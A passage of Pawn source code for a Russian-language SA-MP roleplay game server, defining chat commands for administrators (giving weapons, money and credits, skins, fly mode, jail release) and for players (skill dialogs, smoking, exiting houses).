	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pJail] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в тюрьме!");
	PI[params[0]][pJailTime] = 1;
	MysqlUpdatePlayerInt(params[0], "jailtime", PI[params[0]][pJailTime]);
	ResetPlayerWeapons(params[0]);
	new string[100];
	format(string, sizeof(string), "Администратор %s[%i] выпустил из тюрьмы %s[%i]",GetName(playerid),playerid,GetName(params[0]),params[0]);
	SendClientMessageToAll(COLOR_RED, string);

	format(string, sizeof(string), "Администратор %s[%i] вытащил Вас из тюрьмы",GetName(playerid),playerid);
	SendClientMessage(params[0],COLOR_LIGHTGREEN, string);
	return 1;
}

CMD:unarrest(playerid, params[])
{
	if(PI[playerid][pMember] != TEAM_MERIA) return 1;
	else if(!IsPlayerInRangeOfPoint(playerid, 40.0,611.1249,2769.9980,1250.5100)) return true;
 	else if(PI[playerid][pRank] != 4) return SendClientMessage(playerid, COLOR_GREY, "Доступно только адвокатам!");
	else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unarrest [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	else if(PI[params[0]][pJail] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в тюрьме!");
	SendMes(playerid, COLOR_BLUE, "Вы оформили документы по освобождению %s в размере %dр.", GetName(params[0]), MP1[2]);
	SendMes(params[0], COLOR_BLUE, "Адвокат %s оформил(а) документы по освобождению в размере %dр.", GetName(playerid), MP1[2]);
	SendMess(params[0], MSG_PLAYER_ACCESS);
	SetPVarInt(params[0], "JailPlayer", playerid);
	SetPVarInt(params[0], "JailSumma", MP1[2]);
	SetPVarInt(params[0], "KeyJail", 1);
	return 1;
}

CMD:id(playerid, params[])
{
	if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /id [ID / часть имени]");
	new ids = 0;
	if(!sscanf(params, "u", params[0]))
	{
		if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		SendMes(playerid, COLOR_WHITE, "ID: %d - %s",params[0],GetName(params[0]));
	}
	else
	{
	    foreach(new i: Player)
		{
			if(PlayerLogged[i] == false) continue;
			if(strfind(GetName(i), params[0], true) != -1)
			{
			    SendMes(playerid, COLOR_WHITE, "ID: %d - %s",i,GetName(i));
			    ids++;
			}
		}
		if(ids == 0) SendClientMessage(playerid,-1,"Совпадений не найдено");
	}
	return 1;
}

CMD:givegun(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "uii", params[0],params[1],params[2])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /givegun [id игрока] [id оружия] [кол-во патронов]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if((params[1] < 1 || params[1] > 47) || params[1] == 38) return SendClientMessage(playerid, COLOR_GREY, "ID оружия от 1 до 47!");
	else if(params[2] > 500 || params[2] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество патронов от 1 до 500!");
	GivePlayerWeapon(params[0], params[1], params[2]);
	SendMes(playerid, COLOR_LIME, "Вы установили оружие игроку %s",GetName(params[0]));
	return 1;
}

CMD:atakegun(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /atakegun [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	ResetPlayerWeapons(params[0]);
	//ResetPlayerWeaponsInvAC(params[0]);
	SendMes(playerid, COLOR_YELLOW, "Вы сбросили оружие игроку %s",GetName(params[0]));
	SendMes(params[0], COLOR_GREEN, "Администратор %s обнулил ваше оружие",GetName(playerid));
	return 1;
}

CMD:givemoney(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7)
		return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /givemoney [id игрока] [кол-во денег]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 1000000000 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество денег от 1 до 1000000000!");

	GiveMoney(params[0], params[1]);

	SendMes(playerid, COLOR_LIME, "Вы установили денег игроку: %s", GetName(params[0]));
	SendMes(params[0], COLOR_WHITE, "Администратор %s выписал Вам чек на %dр", GetName(playerid),params[1]);
	SendClientMessage(params[0], COLOR_WHITE, "Деньги были зачислены на Ваш баланс");
	return 1;
}

CMD:givecredits(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;

	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /givecredits [id игрока] [кол-во]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 10000 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество от 1 до 10000!");
	PI[params[0]][pCredits] += params[1];
	PI[params[0]][pTotalCredits] += params[1];
	new string[128];
	format(string, sizeof(string), "Вы перевели %i кредитов на счёт игроку %s", params[1], GetName(params[0]));
	SendClientMessage(playerid, COLOR_GREEN, string);
	format(string, sizeof(string), "На Ваш аккаунт поступили денежные средства", params[1]);
	SendClientMessage(params[0], COLOR_YELLOW, string);
	SendClientMessage(params[0], COLOR_YELLOW, "Чтобы ими воспользоваться, введите /donate");
	format(string, sizeof(string), "UPDATE "T_ACCOUNTS" SET credits=%d,totalcredits=%d WHERE name='%s'", PI[playerid][pCredits], PI[playerid][pTotalCredits], GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");
	PlayerPlaySound(params[0], 6401, 0.0, 0.0, 0.0);
	return 1;
}

CMD:fake(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;

	if(!strlen(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff} /fake [ид игрока] [команда] [параметры]");

	extract params -> new to_player, string:format_cmd[32], string:cmd_param[128];

	if(!IsPlayerConnected(to_player)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[to_player] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);

	if(!strlen(format_cmd)) return SendClientMessage(playerid, C_RED, "Вы не ввели команду");
	if(!strlen(cmd_param)) cmd_param = " ";

	new cmd[64];
	format(cmd, sizeof cmd, "pc_cmd_%s", format_cmd);

	CallLocalFunction(cmd, "is", to_player, cmd_param);

	return 1;
}

/*CMD:avig(playerid, params[])
{
	if(IsPlayerGrandAdmin(playerid))
	{
		if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /avig [id игрока] [кол-во]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(PhoneNumbers[params[0]][4] == 3) return SendClientMessage(playerid, COLOR_GREY, "У игрока уже [3/3] выговора!");
		else if(params[1] > 3 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество от 1 до 3!");
		PhoneNumbers[params[0]][4] += params[1];
		new string[128];
		format(string, sizeof(string), "Вы выдали выговор игроку %s +%i[%i/3]", GetName(params[0]), params[1], PhoneNumbers[params[0]][4]);
        SendClientMessage(playerid, COLOR_GREEN, string);
		format(string, sizeof(string), "Администратор %s выдал вам выговор +%i[%i/3]", GetName(playerid), params[1], PhoneNumbers[playerid][4]);
		SendClientMessage(params[0], COLOR_YELLOW, string);
	}
	return 1;
}
*/
CMD:unavig(playerid, params[])
{
	if(IsPlayerGrandAdmin(playerid))
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unavig [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(PhoneNumbers[params[0]][4] == 0) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет выговоров!");
		PhoneNumbers[params[0]][4] = 0;
		new string[128];
		format(string, sizeof(string), "Вы сняли выговоры игроку %s", GetName(params[0]));
        SendClientMessage(playerid, COLOR_GREEN, string);
		format(string, sizeof(string), "Администратор %s снял с Вас все выговоры.", GetName(playerid));
		SendClientMessage(params[0], COLOR_YELLOW, string);
	}
	return 1;
}

CMD:resetmoney(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;

	if(!IsPlayerDeveloperAdmin(playerid)) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /resetmoney [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	ResetMoney(params[0]);
	SendMes(playerid, COLOR_LIME, "Вы сбросили денег игроку %s", GetName(params[0]));
	return 1;
}

CMD:slap(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /slap [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PI[playerid][pAdmin] < PI[params[0]][pAdmin])
		return SendClientMessage(playerid, -1, "Вы не можете шлепнуть игрока, имеющего большее количество полномочий.");
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new Float:shealth,Float:slx, Float:sly, Float:slz;
	GetPlayerHealth(params[0], shealth);
	SetHealth(params[0], shealth-5);
	GetPlayerPos(params[0], slx, sly, slz);
	SetPlayerPos(params[0], slx, sly, slz+5);
	PlayerPlaySound(params[0], 1130, slx, sly, slz+5);
	new string[128];
	format(string, sizeof(string), "[A] %s[%d] подкинул игрока %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:alogin(playerid, params[])
{
    if(GetPVarInt(playerid, "check_alogin") > gettime()) return 1;
    else if(AdminLogged[playerid]) return SendClientMessage(playerid, COLOR_GREY, "Вы уже авторизовались как администратор!");

 	new string[128];
	format(string, sizeof(string), "SELECT * FROM "T_ADMIN" WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, string, "Alogin", "is", playerid, GetName(playerid));
 	SetPVarInt(playerid, "check_alogin", gettime()+5);
 	return 1;
}
/*CMD:afly(playerid,params[])
{
    if(PI[playerid][pAdmin] < 1) return true;
    SetPVarInt(playerid,"spawn_ac",1);

    new inter, world, Float:X, Float:Y, Float:Z, Float:FA;
	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, FA);
	inter = GetPlayerInterior(playerid);
	world = GetPlayerVirtualWorld(playerid);

	if(GetPVarType(playerid, "FlyMode"))
	{

		CancelFlyMode(playerid);

	}
	else
	{
		SetPVarInt(playerid, "SpecBool", 1);
		SetPVarFloat(playerid, "SpecX", X);
		SetPVarFloat(playerid, "SpecY", Y);
		SetPVarFloat(playerid, "SpecZ", Z);
		SetPVarFloat(playerid, "SpecFA", FA);
		SetPVarInt(playerid, "SpecInt", inter);
		SetPVarInt(playerid, "SpecWorld", world);
		FlyMode(playerid);
		SendClientMessage(playerid, 0xFFCC00FF, "????? ????????? ????? ??????, ??????? ??? ??? ??????? /afly");
	}
	return true;
}*/
CMD:fly(playerid)
{
	if(PI[playerid][pAdmin] < 1) return true;
	{
		if(player_is_flying[playerid] != 1)
		{
			StartFly(playerid);

			GameTextForPlayer(playerid, "fly mode is ~g~on", 3000, 5);

			player_is_flying[playerid] = 1;

			SetPVarInt(playerid, "spawn_ac", 1);
		}

		else
		{
			StopFly(playerid);

			GameTextForPlayer(playerid, "fly mode is ~r~off", 3000, 5);

			player_is_flying[playerid] = 0;

			DeletePVar(playerid, "spawn_ac");
		}
	}

	return 1;
}
CMD:setsex(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setsex [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new string[128];
	switch(PI[params[0]][pSex])
	{
	case 1:
		{
		    format(string, sizeof(string), "Вы изменили пол игроку %s на женский", GetName(params[0]));
			SendClientMessage(playerid, COLOR_LIME, string);
			SendClientMessage(params[0], COLOR_LIME, "Администратор изменил Ваш пол на женский");
			PI[params[0]][pSex] = 2;
		}
	case 2:
		{
		    format(string, sizeof(string), "Вы изменили пол игроку %s на мужской",GetName(params[0]));
			SendClientMessage(playerid, COLOR_LIME, string);
			SendClientMessage(params[0], COLOR_LIME, "Администратор изменил Ваш пол на мужской");
			PI[params[0]][pSex] = 1;
		}
	}
	MysqlUpdatePlayerInt(params[0], "sex", 	PI[params[0]][pSex]);
	return 1;
}

CMD:getfamily(playerid) // test
{
	for(new idx; idx < TOTALFAMILY; idx++)
	{
	    if(!strcmp(g_family_info[idx][F_OWNER], GetName(playerid), true)) printf("ID Семьи: %d", idx);
	}
	return 1;
}

CMD:tempskin(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /tempskin [id игрока] [id внешности]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 299 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Неверный id внешности. Можно установить от 1 до 299");
	SetPlayerSkin(params[0], params[1]);
	new string[128];
	format(string, sizeof(string), "Администратор %s выдал Вам временный скин", GetName(playerid));
	SendClientMessage(params[0], COLOR_LIME, string);
	format(string, sizeof(string), "Вы выдали временный скин [%i] игроку %s", params[1], GetName(params[0]));
	SendClientMessage(playerid, COLOR_LIME, string);
	format(string, sizeof(string), "[A] %s[%i] выдал временный скин %s[%d] (%i)", GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:setskin(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setskin [id игрока] [id внешности]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 299 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Неверный id внешности. Можно установить от 1 до 299");
	PI[params[0]][pModel] = params[1];
	SetPlayerSkin(params[0], PI[params[0]][pModel]);
	MysqlUpdatePlayerInt(params[0], "model", PI[params[0]][pModel]);
	new string[128];
	format(string, sizeof(string), "Администратор %s выдал Вам статический скин", GetName(playerid));
	SendClientMessage(params[0], COLOR_LIME, string);
	format(string, sizeof(string), "Вы выдали статический скин [%i] игроку %s", params[1], GetName(params[0]));
	SendClientMessage(playerid, COLOR_LIME, string);
	return 1;
}

CMD:exit(playerid, params[])
{
	if(TextResetCMD[playerid] > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Не флуди");
	SetTimerEx("PickupBack",3000,0,"i",playerid);
	pickupentered[playerid] = 1;
	new a = GetPVarInt(playerid, "PlayerHouse");
	if(PlayerToPoint(3.0, playerid, 2934.4077,2967.4949,3176.5769) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
	{
		SetPlayerInterior(playerid, HouseInfo[a][hInt]);
		SetPlayerVirtualWorld(playerid, HouseInfo[a][hVirtual]);
		SetPlayerPos(playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]);
	}
	if(HouseInfo[a][hGarage] == 1)
	{
		if(PlayerToPoint(8.0, playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
			ShowPlayerDialog(playerid, D_HOME+1, DIALOG_STYLE_LIST, "Куда Вы хотите выйти?", "- На улицу\n- В гараж", "Ок", "Закрыть");
	}
	else
	{
		if(PlayerToPoint(8.0, playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
		{
		    FreezePlayer(playerid, 3000);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPos(playerid, HouseInfo[a][hEntrx], HouseInfo[a][hEntry], HouseInfo[a][hEntrz]);
		}
	}
	return 1;
}

CMD:jskill(playerid)
{
	STRING_GLOBAL[0] = EOS;
	new fmt_str[70];

	strcat(STRING_GLOBAL, "{f6e58d}Дальнобойщик:\n\n");

	format(fmt_str, sizeof fmt_str, "{FFFFFF}Всего рейсов:\t\t\t{f6e58d}%d/30\n", g_player_skills[playerid][S_T_FLIGHTS]);
	strcat(STRING_GLOBAL,fmt_str);

	format(fmt_str, sizeof fmt_str, "{FFFFFF}Уровень дальнобойщика:\t{f6e58d}%d\n\n",  g_player_skills[playerid][S_T_COUNT]);
	strcat(STRING_GLOBAL,fmt_str);

	strcat(STRING_GLOBAL, "{f6e58d}Таксист:\n\n");

	format(fmt_str, sizeof fmt_str, "{FFFFFF}выполнено заказов:\t\t{f6e58d}%d\n\n", g_player_skills[playerid][S_TAXI_CALLS]);
	strcat(STRING_GLOBAL,fmt_str);

	strcat(STRING_GLOBAL, "{f6e58d}Механик:\n\n");

	format(fmt_str, sizeof fmt_str, "{FFFFFF}Починено автомобилей:\t{f6e58d}%d\n\n", g_player_skills[playerid][S_M_FIX]);
	strcat(STRING_GLOBAL,fmt_str);

	strcat(STRING_GLOBAL, "{f6e58d}Автобусник:\n\n");

	format(fmt_str, sizeof fmt_str, "{FFFFFF}Сделано рейсов:\t\t{f6e58d}%d\n\n", g_player_skills[playerid][S_B_FLIGHTS]);
	strcat(STRING_GLOBAL,fmt_str);

	strcat(STRING_GLOBAL, "{f6e58d}Фермер:\n\n");

	format(fmt_str, sizeof fmt_str, "{FFFFFF}Уровень:\t\t\t{f6e58d}%d\n", g_player_skills[playerid][S_FERM_LVL]);
	strcat(STRING_GLOBAL,fmt_str);

	format(fmt_str, sizeof fmt_str, "{FFFFFF}Получено опыта:\t\t{f6e58d}%d/150\n\n", g_player_skills[playerid][S_FERM_COUNT]);
	strcat(STRING_GLOBAL,fmt_str);

	ShowPlayerDialog
	(
		playerid, 0, DIALOG_STYLE_MSGBOX,
		"{f6e58d}Трудовые навыки",
		STRING_GLOBAL,
		"Закрыть", ""
	);

	return 1;
}

CMD:skill(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /skill [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new Stats_Level[8][30];
    if(g_player_skills[playerid][S_GUN][0] <= 10) Stats_Level[0] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][0] <= 30) Stats_Level[0] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][0] <= 70) Stats_Level[0] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][0] <= 90) Stats_Level[0] = "{F09945}[Хорошо]";
    else Stats_Level[0] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][1] <= 10) Stats_Level[1] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][1] <= 30) Stats_Level[1] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][1] <= 70) Stats_Level[1] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][1] <= 90) Stats_Level[1] = "{F09945}[Хорошо]";
    else Stats_Level[1] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][2] <= 10) Stats_Level[2] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][2] <= 30) Stats_Level[2] = "{F06245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][2] <= 70) Stats_Level[2] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][2] <= 90) Stats_Level[2] = "{F09945}[Хорошо]";
    else Stats_Level[2] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][3] <= 10) Stats_Level[3] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][3] <= 30) Stats_Level[3] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][3] <= 70) Stats_Level[3] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][3] <= 90) Stats_Level[3] = "{F09945}[Хорошо]";
    else Stats_Level[3] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][4] <= 10) Stats_Level[4] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][4] <= 30) Stats_Level[4] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][4] <= 70) Stats_Level[4] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][4] <= 90) Stats_Level[4] = "{F09945}[Хорошо]";
    else Stats_Level[4] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][5] <= 10) Stats_Level[5] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][5] <= 30) Stats_Level[5] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][5] <= 70) Stats_Level[5] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][5] <= 90) Stats_Level[5] = "{F09945}[Хорошо]";
    else Stats_Level[5] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][6] <= 10) Stats_Level[6] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][6] <= 30) Stats_Level[6] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][6] <= 70) Stats_Level[6] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][6] <= 90) Stats_Level[6] = "{F09945}[Хорошо]";
    else Stats_Level[6] = "{FFFF00}[Отлично]";
    if(g_player_skills[playerid][S_GUN][7] <= 10) Stats_Level[7] = "{F04245}[Очень плохо]";
    else if(g_player_skills[playerid][S_GUN][7] <= 30) Stats_Level[7] = "{F04245}[Плохо]";
    else if(g_player_skills[playerid][S_GUN][7] <= 70) Stats_Level[7] = "{63BD4E}[Нормально]";
    else if(g_player_skills[playerid][S_GUN][7] <= 90) Stats_Level[7] = "{F09945}[Хорошо]";
    else Stats_Level[7] = "{FFFF00}[Отлично]";
	new string[56], string_dialogue[400];
	format(string_dialogue, sizeof(string_dialogue), "\
	{FFFFFF}Pistol 9mm\t\t%d%%\t%s\n\
	{FFFFFF}Silenced 9mm:\t\t%d%%\t%s\n\
	{FFFFFF}Desert Eeagle:\t\t%d%%\t%s\n\
	{FFFFFF}Shotgun:\t\t%d%%\t%s\n\
	{FFFFFF}Micro Uzi\t\t%d%%\t%s\n\
	{FFFFFF}MP5\t\t\t%d%%\t%s\n\
	{FFFFFF}AK47:\t\t\t%d%%\t%s\n\
	{FFFFFF}M4A1:\t\t\t%d%%\t%s",
	g_player_skills[playerid][S_GUN][6], Stats_Level[6],
	g_player_skills[playerid][S_GUN][0], Stats_Level[0],
	g_player_skills[playerid][S_GUN][1], Stats_Level[1],
	g_player_skills[playerid][S_GUN][2], Stats_Level[2],
	g_player_skills[playerid][S_GUN][7], Stats_Level[7],
	g_player_skills[playerid][S_GUN][3], Stats_Level[3],
	g_player_skills[playerid][S_GUN][4], Stats_Level[4],
	g_player_skills[playerid][S_GUN][5], Stats_Level[5]);
	ShowPlayerDialog(params[0], D_NULL, DIALOG_STYLE_MSGBOX, "Навыки игрока", string_dialogue, "Закрыть", "");
	if(PI[playerid][pSex] == 1) format(string, sizeof(string), "показал свои навыки %s", GetName(params[0]));
	else format(string, sizeof(string), "показалa свои навыки %s", GetName(params[0]));
	MeAction(playerid, string);
	return 1;
}

CMD:smoke(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid,100.0,645.9722,-339.3981,-94.7852)) return SendClientMessage(playerid, -1, "В больнице запрещено курить!");
	new ok=0;
 	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==37){ok=s;break;}
   	}
   	if(ok==0){return SendClientMessage(playerid, COLOR_GREY, "У Вас нет сигарет, купите их в супермаркете или 24/7!");}
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
	if(PlayerItem2[playerid][ok] == 0)
	{
 		PlayerItem1[playerid][ok]=0;
   	}
   	PlayerItem2[playerid][ok]--;
    SaveItem(playerid,ok);
	if(PI[playerid][pHunger] <= 97) GiveHunger(playerid, 3);
	else SetHunger(playerid, 100);
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
	if(PI[playerid][pSex] == 1) MeAction(playerid, "достал сигарету и закурил её");
	else MeAction(playerid, "достала сигарету и закурила её");
	return 1;
}

CMD:fuel(playerid)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
    new ok=0;
 	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==31)
		{
			ok=s;
			break;
		}
   	}
   	if(ok==0){return SendClientMessage(playerid, COLOR_GREY, "У Вас нет канистры, купите её на заправочной станции!");}
    else if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорт!");
